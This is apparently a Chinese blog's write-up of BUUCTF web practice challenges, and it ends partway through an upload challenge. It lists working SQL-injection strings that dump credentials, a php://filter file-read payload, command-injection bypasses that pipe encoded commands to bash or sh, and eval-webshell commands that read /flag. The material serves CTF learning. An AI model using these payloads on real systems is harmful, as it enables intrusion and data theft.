

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="keep something">
  <meta name="author" content="luom">
  <meta name="keywords" content="">
  <title>BUUCTF web刷题记录 WP - RC9&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/post.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="BUUCTF web刷题记录 WP">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-03-29 19:51" pubdate>
        2022年3月29日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.3k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      33
       分钟
    </span>
  

  
  
    
      <!-- LeanCloud 统计文章PV -->
      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">BUUCTF web刷题记录 WP</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：2024年1月4日 下午
                
              </p>
            
            <div class="markdown-body">
              <h2 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h2>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gtx690/p/13176458.html">参考博客园WP1+常见sql_mode介绍</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/111398725">CSDN
WP2</a></p>
<p><a target="_blank" rel="noopener" href="http://mysql.jsrun.net/">在线mysql执行🔗</a></p>
<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088">在线mysql执行2🔗</a></p>
</blockquote>
<ul>
<li><span style="background:#ffbbff;"><strong>知识点：</strong></span></li>
</ul>
<pre><code class="hljs oxygene">堆叠查询

后端代码猜测

<span class="hljs-number">1</span> || ** ，||双作用

<span class="hljs-keyword">set</span> sql_mode = pipes_as_concat 命令理解（为什么没有过滤<span class="hljs-keyword">set</span>、<span class="hljs-keyword">concat</span>的原因）</code></pre>
<p>万能密码' or '1'='1发现waf</p>
<p>尝试堆叠注入</p>
<p>输入query=1;select 2;返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 2
)，</p>
<p>query=1;select database();返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt;
ctf )，得到数据库：ctf，</p>
<p>query=1;show tables;返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag
)，得到表Flag</p>
<ul>
<li><p>获取数据表结构:</p>
<p>desc 表名;</p>
<p>show columns from 表名;</p></li>
</ul>
<p>但是都被拦截，估计过滤了关键词flag</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-operator.html">mysql运算符</a></p>
</blockquote>
<p>mysq里逻辑运算符：与：and，或：or、||，非：not、！，异或：xor</p>
<p><strong>单个|是按位或运算符，&amp;是按位与，^是按位异或</strong></p>
<p>运算符优先级：</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126153927429.png" srcset="/img/loading.gif" alt="image-20220126153927429" style="zoom: 50%;"></p>
<h3 id="双作用或连接">||双作用：或、连接</h3>
<ol type="1">
<li>逻辑或</li>
</ol>
<p>本地测试</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;a&#x27;</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //1
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> student;  //1 student表里有id列名
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //0
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //1</code></pre>
<p>==》==逻辑或（or），只要||前后是存在的字段名或着非0的数，就判定正确==</p>
<ol start="2" type="1">
<li>连接符，类似concat函数</li>
</ol>
<p><strong>sql_mode=pipes_as_concat</strong>：把||当成字符串连接符而非逻辑或运算，==若拼接的是列名，则会显示查询结果再拼接==</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160732988.png" srcset="/img/loading.gif" alt="image-20220126160732988" style="zoom:50%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160820866.png" srcset="/img/loading.gif" alt="image-20220126160820866" style="zoom:50%;"></p>
<p>猜测：</p>
<blockquote>
<p><strong>这道题目需要我们去对后端语句进行猜测，有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符，==通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||==，也就是select
输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select
post进去的数据||flag from
Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用</strong></p>
</blockquote>
<p>关键，执行的sql语句是</p>
<pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select &quot;</span>.<span class="hljs-symbol">$post</span>[<span class="hljs-string">&#x27;query&#x27;</span>].<span class="hljs-string">&quot;||flag from Flag&quot;</span>;
<span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select xxx ||flag from Flag&quot;</span>;</code></pre>
<p>解法1：</p>
<p><code>*,1</code></p>
<pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;
即<span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;
即查出了<span class="hljs-built_in">Flag</span>表中的所有内容+新增一列全<span class="hljs-number">1</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163149707.png" srcset="/img/loading.gif" alt="image-20220126163149707" style="zoom:80%;"></p>
<p>解法2：</p>
<p><code>1;set sql_mode=pipes_as_concat;select 1</code></p>
<pre><code class="hljs sqf"><span class="hljs-built_in">select</span> <span class="hljs-number">1</span>;<span class="hljs-built_in">set</span> sql_mode=pipes_as_concat;<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;
执行两次查询，后一次<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;即把<span class="hljs-built_in">select</span> <span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;的结果和<span class="hljs-number">1</span>拼接生成新一列</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163217854.png" srcset="/img/loading.gif" alt="image-20220126163217854" style="zoom:80%;"></p>
<p><a target="_blank" rel="noopener" href="http://www.xianxianlabs.com/blog/2020/05/27/355.html">源码</a>，发现也是multi_query()执行多条语句产生的漏洞</p>
<h2 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h2>
<h3 id="考点文件包含伪协议"><span style="background:#ffbbff;">考点：文件包含、伪协议</span></h3>
<ol type="1">
<li>点击超链接跳转到Archive_room.php，点击secret超链接发现秒跳转到end.php，而不显示secret超链接的文件action.php，用burpshuite抓包，得到提示内容</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127161616536.png" srcset="/img/loading.gif" alt="image-20220127161616536"></p>
<ol start="2" type="1">
<li>访问secr3t.php，发现源码</li>
</ol>
<pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;secret&lt;&#x2F;title&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
&lt;?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file&#x3D;$_GET[&#39;file&#39;];
    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
        echo &quot;Oh no!&quot;;
        exit();
    &#125;
    include($file); 
&#x2F;&#x2F;flag放在了flag.php里
?&gt;
&lt;&#x2F;html&gt;</code></pre>
<p>文件包含，利用伪协议读取文件，发现过滤了php://input、data://，也不能用截断</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/15063209941952.png" srcset="/img/loading.gif" alt="伪协议总结"></p>
<p>php://filter
伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然<strong>会直接当做php代码执行，看不到源代码内容</strong>（file=flag.php）</p>
<p>payload：</p>
<pre><code class="hljs awk">secr3t.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php</code></pre>
<p>读取flag.php源码，解密得到flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127162708933.png" srcset="/img/loading.gif" alt="image-20220127162708933" style="zoom:50%;"></p>
<h2 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</h2>
<h4 id="考点手注字符注入"><span style="background:#ffbbff;">考点：手注字符注入</span></h4>
<p>输入'回显报错提示==》有字符注入</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164535555.png" srcset="/img/loading.gif" alt="image-20220127164535555"></p>
<p>输入万能密码，得到提示admin+密码：f3dd35cabf06e25a413446369583a7b8，尝试登陆无果</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164411998.png" srcset="/img/loading.gif" alt="image-20220127164411998"></p>
<p>'后加#就不会报错，注释：</p>
<pre><code class="hljs 1c">输入框的时候用<span class="hljs-meta">#，在地址栏/hackbar的时候使用%23</span></code></pre>
<p>判断列数：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">4</span>%<span class="hljs-number">23</span> //报错
<span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //不报错，说明有三列</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164914313.png" srcset="/img/loading.gif" alt="image-20220127164914313" style="zoom:50%;"></p>
<p>判断回显位置：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //回显在<span class="hljs-number">2</span>，<span class="hljs-number">3</span>处</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164929580.png" srcset="/img/loading.gif" alt="image-20220127164929580" style="zoom:50%;"></p>
<p>爆库名</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  <span class="hljs-comment">//geek</span></code></pre>
<p>爆当前库下表名</p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="hljs-number">23</span>  //geekuser,l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span></code></pre>
<p>爆当前库下所有列名</p>
<pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()%<span class="hljs-number">23</span>  //<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span></code></pre>
<p>爆指定库字段</p>
<pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> l0ve1ysq1%<span class="hljs-number">23</span></code></pre>
<p>1--cl4y--wo_tai_nan_le,2--glzjin--glzjin_wants_a_girlfriend,3--Z4cHAr7zCr--biao_ge_dddd_hm,4--0xC4m3l--linux_chuang_shi_ren,5--Ayrain--a_rua_rain,6--Akko--yan_shi_fu_de_mao_bo_he,7--fouc5--cl4y,8--fouc5--di_2_kuai_fu_ji,9--fouc5--di_3_kuai_fu_ji,10--fouc5--di_4_kuai_fu_ji,11--fouc5--di_5_kuai_fu_ji,12--fouc5--di_6_kuai_fu_ji,13--fouc5--di_7_kuai_fu_ji,14--fouc5--di_8_kuai_fu_ji,15--leixiao--Syc_san_da_hacker,16--flag--flag{03addeba-bef3-4821-86bd-04c7690ea3a6}</p>
<p>得到flag</p>
<h2 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h2>
<h3 id="考点命令执行过滤绕过变量拼接">考点：命令执行、过滤绕过、变量拼接</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12313368.html">参考WP</a></p>
<p><a target="_blank" rel="noopener" href="https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">个人博客，有各种绕过过滤方法，关键词**</a></p>
</blockquote>
<ol type="1">
<li>执行多条bash语句：</li>
</ol>
<pre><code class="hljs 1c">;
<span class="hljs-string">|   //前面的输出作为后面的输入，被吞掉</span>
<span class="hljs-meta">&amp;</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121137143.png" srcset="/img/loading.gif" alt="image-20220130121137143" style="zoom: 67%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121159304.png" srcset="/img/loading.gif" alt="image-20220130121159304" style="zoom: 67%;"></p>
<ol start="2" type="1">
<li>发现空格被过滤，绕过方法：</li>
</ol>
<pre><code class="hljs powershell">&#123;<span class="hljs-built_in">cat</span>,flag.txt&#125; 
<span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt
<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt
<span class="hljs-built_in">cat</span>&lt;flag.txt
<span class="hljs-built_in">cat</span>&lt;&gt;flag.txt
kg=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;<span class="hljs-built_in">cat</span><span class="hljs-variable">$kg</span>
(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</code></pre>
<ol start="3" type="1">
<li>发现关键词flag被过滤</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121238751.png" srcset="/img/loading.gif" alt="image-20220130121238751" style="zoom:67%;"></p>
<p>先查看index.php<code>/?ip=127.0.0.1;cat$IFS$9index.php</code></p>
<p>得到index.php源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;
  $ip = $_GET[<span class="hljs-string">&#x27;ip&#x27;</span>];
  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;
      <span class="hljs-comment">//$/?*&lt;&gt;&#x27;&quot;\()[]&#123;&#125;\x00-\x1f	</span>
    <span class="hljs-keyword">echo</span> preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);
  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);
  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);
  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);
  &#125;
  $a = shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;
  print_r($a);
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kenshinobiy/p/4443600.html">正则相关知识：</a></p>
<pre><code class="hljs smalltalk">一个点‘.’可以代表所有的单一字符

*紧跟的一个字符的zero or more

字符‘|’相当于<span class="hljs-type">OR</span> 操作：<span class="hljs-comment">&quot;(b│cd)ef&quot;</span>: 匹配含有 <span class="hljs-comment">&quot;bef&quot;</span> 或者 <span class="hljs-comment">&quot;cdef&quot;</span>的字符串;

中括号[xxx]括住的内容只匹配一个单一的字符:<span class="hljs-comment">&quot;^[a-zA-Z]&quot;</span>: 匹配以字母开头的字符串;<span class="hljs-comment">&quot;[a-d]&quot;</span>: 匹配<span class="hljs-string">&#x27;a&#x27;</span> 到<span class="hljs-string">&#x27;d&#x27;</span>的单个字符 (和<span class="hljs-comment">&quot;a│b│c│d&quot;</span> 还有 <span class="hljs-comment">&quot;[abcd]&quot;</span>效果一样);
</code></pre>
<ol start="4" type="1">
<li>==flag被过滤，绕过方法：==</li>
</ol>
<pre><code class="hljs haml">拼接绕过:a=l;b=s;$a$b
编码绕过：
base64：
echo “Y2F0IC9mbGFn”|base64-d|bash
=<span class="ruby">=&gt;cat /flag</span>
<span class="ruby">hex：</span>
<span class="ruby">echo “<span class="hljs-number">636174202</span>f666c6167” <span class="hljs-params">| xxd -r -p|</span>bash</span>
<span class="ruby">==&gt;cat /flag</span>
<span class="ruby">oct：</span>
<span class="ruby">$(printf “\<span class="hljs-number">154</span>\<span class="hljs-number">163</span>”)</span>
<span class="ruby">==&gt;ls</span></code></pre>
<p>payload1：变量拼接：</p>
<p>在flag贪婪匹配里面我们不将flag连着写，就不会匹配到，同时可以看到有$a变量，尝试覆盖它</p>
<pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=lag;a=f;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php
?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9fla</span><span class="hljs-variable">$b</span>.php</code></pre>
<p>payload2：过滤bash，就用sh，sh的大部分脚本都可以在bash下运行。</p>
<pre><code class="hljs stata">bash：
echo <span class="hljs-string">&quot;Y2F0IGZsYWcucGhw&quot;</span>| base64 -<span class="hljs-keyword">d</span> | bash  <span class="hljs-comment">//发现被过滤</span>
<span class="hljs-keyword">sh</span>：
echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-<span class="hljs-keyword">d</span>|<span class="hljs-keyword">sh</span>  <span class="hljs-comment">//成功</span>
Y2F0IGZsYWcucGhw：<span class="hljs-keyword">cat</span> flag.php</code></pre>
<h4 id="奇淫技巧内联执行">“奇淫技巧”：内联执行</h4>
<p>内联，就是将反引号内命令的输出作为输入执行。</p>
<p>秒题大概就是这种做法吧......</p>
<p>==<strong>payload3：内联绕过，无需列出中间结果，可以一次输出多个文件内容</strong>==</p>
<pre><code class="hljs stata">?ip=;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span>`<span class="hljs-keyword">ls</span>`</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130123618657.png" srcset="/img/loading.gif" alt="image-20220130123618657" style="zoom:67%;"></p>
<h2 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h2>
<h3 id="考点eval代码执行">考点：eval代码执行</h3>
<p>eval($_POST["Syc"]);</p>
<p><strong>运用eval()要注意几点:</strong></p>
<ul>
<li>eval函数的==参数的字符串末尾一定要有分号==</li>
<li><strong>eval()</strong> 返回
<strong><code>NULL</code></strong>，不回显，得有echo才回显</li>
</ul>
<p>payload</p>
<pre><code class="hljs ini"><span class="hljs-attr">Syc</span>=echo  `ls`<span class="hljs-comment">;   //看源码，发现只有index.php</span>
<span class="hljs-attr">Syc</span>=echo  `ls /`<span class="hljs-comment">;  //看根目录，发现flag文件</span>
<span class="hljs-attr">Syc</span>=echo  `cat /flag`<span class="hljs-comment">; //得到flag</span></code></pre>
<h2 id="极客大挑战-2019http">[极客大挑战 2019]Http</h2>
<h3 id="考http大概率考http请求体header的用法">考http，大概率考http请求体header的用法</h3>
<p>可以用burpsuite/浏览器hackbar直接加</p>
<ol type="1">
<li>访问网站，查看源码发现跳转文件secret.php</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130133859973.png" srcset="/img/loading.gif" alt="image-20220130133859973"></p>
<ol start="2" type="1">
<li><p>网页显示It doesn't come from
'https://Sycsecret.buuoj.cn'提示不是从某网站跳转过来的==》修改Referer:https://www.Sycsecret.com</p></li>
<li><p>Please use "Syclover" browser
==》修改User-Agent:Syclover</p></li>
<li><p>No!!! you can only read this locally!!!
==》要从本地访问==》修改X-Forwarded-For:127.0.0.1</p></li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130134240237.png" srcset="/img/loading.gif" alt="image-20220130134240237"></p>
<h2 id="极客大挑战-2019upload">[极客大挑战 2019]Upload</h2>
<h3 id="考点图片头绕过php可解析后缀上传位置">考点：&lt;?、图片头绕过、php可解析后缀、上传位置</h3>
<p>查看源码，关键源码</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
